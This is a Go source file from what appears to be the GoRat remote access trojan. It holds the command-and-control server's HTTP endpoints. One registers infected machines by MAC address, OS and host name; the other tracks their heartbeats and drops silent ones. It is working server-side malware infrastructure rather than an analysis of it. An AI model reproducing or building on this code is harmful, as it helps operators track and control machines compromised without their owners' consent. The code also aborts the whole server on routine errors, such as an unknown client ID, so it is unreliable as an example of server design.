package endpoints

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"time"

	"github.com/NotKatsu/GoRat/modules/database"

	"github.com/pterm/pterm"
)

func ConnectionNew(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		OS := r.Header.Get("OS")
		Name := r.Header.Get("Name")
		MACAddress := r.Header.Get("MAC_Address")

		if MACAddress == "" || OS == "" || Name == "" {
			NewUnauthorizedError := Error{
				ErrorCode:    http.StatusUnauthorized,
				ErrorMessage: "Content is missing from request headers.",
			}

			w.WriteHeader(http.StatusUnauthorized)

			NewReturnUnauthorizedError, err := json.Marshal(NewUnauthorizedError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			} else {
				_, err := w.Write(NewReturnUnauthorizedError)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				}
			}
		} else {
			CustomID := base64.StdEncoding.EncodeToString([]byte(MACAddress)) + "." + base64.StdEncoding.EncodeToString([]byte(OS)) + "." + base64.StdEncoding.EncodeToString([]byte(Name))

			if database.GetConnectionData(CustomID) == "" {
				if database.ConnectionNew(CustomID) == false {
					NewError := Error{
						ErrorCode:    http.StatusForbidden,
						ErrorMessage: "A database error occured while trying to insert the document.",
					}

					w.WriteHeader(http.StatusForbidden)

					NewReturnError, err := json.Marshal(NewError)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					} else {
						_, err := w.Write(NewReturnError)

						if err != nil {
							pterm.Fatal.WithFatal(true).Println(err)
						}
					}
				} else {
					ConnectionSuccessJson := ConnectionSuccess{
						ID: CustomID,
					}

					w.WriteHeader(http.StatusOK)

					NewConnectionSuccessJson, err := json.Marshal(ConnectionSuccessJson)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					} else {
						_, err := w.Write(NewConnectionSuccessJson)

						if err != nil {
							pterm.Fatal.WithFatal(true).Println(err)
						}
					}
				}
			} else {
				NewError := Error{
					ErrorCode:    http.StatusForbidden,
					ErrorMessage: "Please send another heartbeat then create a new connection request.",
				}

				w.WriteHeader(http.StatusForbidden)

				NewReturnError, err := json.Marshal(NewError)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				} else {
					_, err := w.Write(NewReturnError)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					}
				}
			}
		}

	} else {
		NewMethodError := Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "POST is the only accepted Method for this endpoint.",
		}

		w.WriteHeader(http.StatusMethodNotAllowed)

		NewReturnMethodError, err := json.Marshal(NewMethodError)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		} else {
			_, err := w.Write(NewReturnMethodError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}
	}
}

func ConnectionHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		ID := r.Header.Get("ID")

		if ID == "" {
			NewUnauthorizedError := Error{
				ErrorCode:    http.StatusUnauthorized,
				ErrorMessage: "Content is missing from request headers.",
			}

			w.WriteHeader(http.StatusUnauthorized)

			NewReturnUnauthorizedError, err := json.Marshal(NewUnauthorizedError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			} else {
				_, err := w.Write(NewReturnUnauthorizedError)

				if err != nil {
					pterm.Fatal.WithFatal(true).Println(err)
				}
			}
		} else {
			storedTimeString := database.GetConnectionData(ID)

			if storedTimeString == "" {
				pterm.Fatal.WithFatal(true).Println("Valid connection couldn't be found")
			} else {
				storedTime, err := time.Parse("2006-01-02 15:04:05.999999999-07:00", storedTimeString)

				if err != nil {
					fmt.Println("Error parsing time:", err)
					return
				}
				currentTime := time.Now()
				timeDifference := currentTime.Sub(storedTime)

				seconds := timeDifference.Seconds()

				if seconds >= 5 {
					NewError := Error{
						ErrorCode:    http.StatusForbidden,
						ErrorMessage: "Connection was closed as a heartbeat was not sent in the last 5 seconds.",
					}
					w.WriteHeader(http.StatusForbidden)

					NewJsonError, err := json.Marshal(NewError)

					if err != nil {
						pterm.Fatal.WithFatal(true).Println(err)
					} else {
						_, err := w.Write(NewJsonError)

						if err != nil {
							pterm.Fatal.WithFatal(true).Println(err)
						} else {
							if database.DeleteConnection(ID) == false {
								pterm.Fatal.WithFatal(true).Println("Failed to delete connection from database.")
							}
						}
					}
				} else {
					if database.UpdateConnection(ID) == false {
						pterm.Fatal.WithFatal(true).Println("Failed to update connection in database.")
					} else {
						NewHeartbeatSuccess := HeartBeatSuccess{
							Time: time.Now(),
						}
						w.WriteHeader(http.StatusOK)

						NewResponseHeartbeatSuccess, err := json.Marshal(NewHeartbeatSuccess)

						if err != nil {
							pterm.Fatal.WithFatal(true).Println(err)

						} else {
							_, err := w.Write(NewResponseHeartbeatSuccess)

							if err != nil {
								pterm.Fatal.WithFatal(true).Println(err)
							}
						}

					}
				}
			}
		}

	} else {
		NewMethodError := Error{
			ErrorCode:    http.StatusMethodNotAllowed,
			ErrorMessage: "POST is the only accepted Method for this endpoint.",
		}

		w.WriteHeader(http.StatusMethodNotAllowed)

		NewReturnMethodError, err := json.Marshal(NewMethodError)

		if err != nil {
			pterm.Fatal.WithFatal(true).Println(err)
		} else {
			_, err := w.Write(NewReturnMethodError)

			if err != nil {
				pterm.Fatal.WithFatal(true).Println(err)
			}
		}
	}
}
